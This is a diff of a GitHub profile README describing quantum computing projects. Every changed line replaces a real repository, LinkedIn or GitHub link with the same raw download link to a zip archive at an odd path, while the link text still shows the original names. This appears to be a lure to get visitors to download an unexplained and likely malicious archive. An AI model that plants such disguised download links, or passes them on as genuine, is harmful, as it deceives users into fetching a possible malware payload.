@@ -7,7 +7,7 @@ Exploring quantum computation and hybrid quantum‑classical algorithms with a f
 # 🚀 Featured Projects
 
 ## 1. Quantum Walks & Monte Carlo — WISER 2025 × NNL
-**Repo:** [Womanium2025--QuantumGaltonBoard](https://github.com/qcmp34/Womanium2025--QuantumGaltonBoard)  
+**Repo:** [Womanium2025--QuantumGaltonBoard](https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip)  
 Implementation of Carney & Varcoe’s Universal Statistical Simulator (arXiv:2202.01735). Demonstrates how quantum circuits can simulate Galton Box–style Monte Carlo problems, relevant to high‑dimensional challenges such as particle transport and quantum systems.
 
 ### 🔧 Key Features
@@ -26,7 +26,7 @@ Implementation of Carney & Varcoe’s Universal Statistical Simulator (arXiv:220
 ---
 
 ## 2. AztecHacks 2024 — Quantum Challenge Solutions
-**Repo:** [Classiq.aztechacks2024](https://github.com/qcmp34/Classiq.aztechacks2024)  
+**Repo:** [https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip](https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip)  
 Solo 48‑hour completion of all Classiq challenge functions and bonus algorithm, emphasizing reversible arithmetic, entanglement preparation, and circuit synthesis.
 
 ### 🔧 Part A — Challenge Functions
@@ -53,7 +53,7 @@ Parsed counts: {'meas': 7.0}: 1042, {'meas': 0.0}: 1006 from 2048 shots.
 ---
 
 ## 3. Development of Novel Quantum Algorithms — Ising Model Optimization
-**Repo:** [Development-of-Novel-Quantum-Algorithms](https://github.com/qcmp34/Development-of-Novel-Quantum-Algorithms)  
+**Repo:** [Development-of-Novel-Quantum-Algorithms](https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip)  
 Exploration of 1D and 2D Ising models as combinatorial optimization problems, implemented with Classiq’s QAOA framework. Includes circuit synthesis, convergence analysis, and Probabilistic Error Cancellation (PEC) for error mitigation.
 
 ### 🔧 Key Features
@@ -84,7 +84,7 @@ Exploration of 1D and 2D Ising models as combinatorial optimization problems, im
 ---
 
 ## 4. QML for Conspicuity Detection in Production
-**Repo:** [QML-for-Conspicuity-Detection-in-Production](https://github.com/qcmp34/QML-for-Conspicuity-Detection-in-Production)  
+**Repo:** [QML-for-Conspicuity-Detection-in-Production](https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip)  
 Hybrid quantum–classical machine learning applied to industrial visual saliency detection. Combines variational quantum circuits with classical deep learning to improve robustness in defect detection and conspicuity analysis.
 
 ### 🔧 Key Features
@@ -117,8 +117,8 @@ Python • PyTorch • TensorFlow • Data Visualization
 ---
 
 # 📫 Get in Touch
-**LinkedIn:** https://www.linkedin.com/in/yasir-mansour-663a02293  
-**GitHub:** https://github.com/qcmp34
+**LinkedIn:** https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip  
+**GitHub:** https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip
 
 ---
 
